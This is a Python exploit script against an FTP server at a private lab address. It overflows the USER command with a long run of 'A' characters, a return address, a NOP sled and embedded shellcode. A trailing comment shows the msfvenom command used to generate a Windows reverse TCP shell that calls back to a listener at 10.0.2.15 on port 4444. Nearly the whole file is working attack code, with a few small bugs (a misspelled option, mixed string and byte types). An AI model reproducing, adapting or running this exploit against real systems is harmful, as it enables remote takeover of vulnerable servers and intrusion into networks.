#!/usr/bin/env python3
import sys, socket, time

host = '10.0.2.6'
port = 21
ret = "\x28\x6c\x9A\x76"
nop = "\x90" * 20
buf = b""
buf += b"\xba\xd8\xbe\xcc\x48\xdb\xd0\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
buf += b"\x52\x83\xc5\x04\x31\x55\x0e\x03\x8d\xb0\x2e\xbd\xd1\x25\x2c"
buf += b"\x3e\x29\xb6\x51\xb6\xcc\x87\x51\xac\x85\xb8\x61\xa6\xcb\x34"
buf += b"\x09\xea\xff\xcf\x7f\x23\xf0\x78\x35\x15\x3f\x78\x66\x65\x5e"
buf += b"\xfa\x75\xba\x80\xc3\xb5\xcf\xc1\x04\xab\x22\x93\xdd\xa7\x91"
buf += b"\x03\x69\xfd\x29\xa8\x21\x13\x2a\x4d\xf1\x12\x1b\xc0\x89\x4c"
buf += b"\xbb\xe3\x5e\xe5\xf2\xfb\x83\xc0\x4d\x70\x77\xbe\x4f\x50\x49"
buf += b"\x3f\xe3\x9d\x65\xb2\xfd\xda\x42\x2d\x88\x12\xb1\xd0\x8b\xe1"
buf += b"\xcb\x0e\x19\xf1\x6c\xc4\xb9\xdd\x8d\x09\x5f\x96\x82\xe6\x2b"
buf += b"\xf0\x86\xf9\xf8\x8b\xb3\x72\xff\x5b\x32\xc0\x24\x7f\x1e\x92"
buf += b"\x45\x26\xfa\x75\x79\x38\xa5\x2a\xdf\x33\x48\x3e\x52\x1e\x05"
buf += b"\xf3\x5f\xa0\xd5\x9b\xe8\xd3\xe7\x04\x43\x7b\x44\xcc\x4d\x7c"
buf += b"\xab\xe7\x2a\x12\x52\x08\x4b\x3b\x91\x5c\x1b\x53\x30\xdd\xf0"
buf += b"\xa3\xbd\x08\x56\xf3\x11\xe3\x17\xa3\xd1\x53\xf0\xa9\xdd\x8c"
buf += b"\xe0\xd2\x37\xa5\x8b\x29\xd0\xc0\x4b\x33\x2f\xbd\x49\x33\x3e"
buf += b"\x61\xc7\xd5\x2a\x89\x81\x4e\xc3\x30\x88\x04\x72\xbc\x06\x61"
buf += b"\xb4\x36\xa5\x96\x7b\xbf\xc0\x84\xec\x4f\x9f\xf6\xbb\x50\x35"
buf += b"\x9e\x20\xc2\xd2\x5e\x2e\xff\x4c\x09\x67\x31\x85\xdf\x95\x68"
buf += b"\x3f\xfd\x67\xec\x78\x45\xbc\xcd\x87\x44\x31\x69\xac\x56\x8f"
buf += b"\x72\xe8\x02\x5f\x25\xa6\xfc\x19\x9f\x08\x56\xf0\x4c\xc3\x3e"
buf += b"\x85\xbe\xd4\x38\x8a\xea\xa2\xa4\x3b\x43\xf3\xdb\xf4\x03\xf3"
buf += b"\xa4\xe8\xb3\xfc\x7f\xa9\xc4\xb6\xdd\x98\x4c\x1f\xb4\x98\x10"
buf += b"\xa0\x63\xde\x2c\x23\x81\x9f\xca\x3b\xe0\x9a\x97\xfb\x19\xd7"
buf += b"\x88\x69\x1d\x44\xa8\xbb"

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Declare TCP Socket
client.connect((host, port)) #connect to host and port
client.recv(1024) # 1024 bits for receiving FTP banner
client.send("user " + "A" * 2006 + ret + nop + buf) #send user command with string of A's
client.close() # Close connection so we can try again


# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 EXITFUC=thread -f c -a x86 -b "\x00\x0a\x0d"
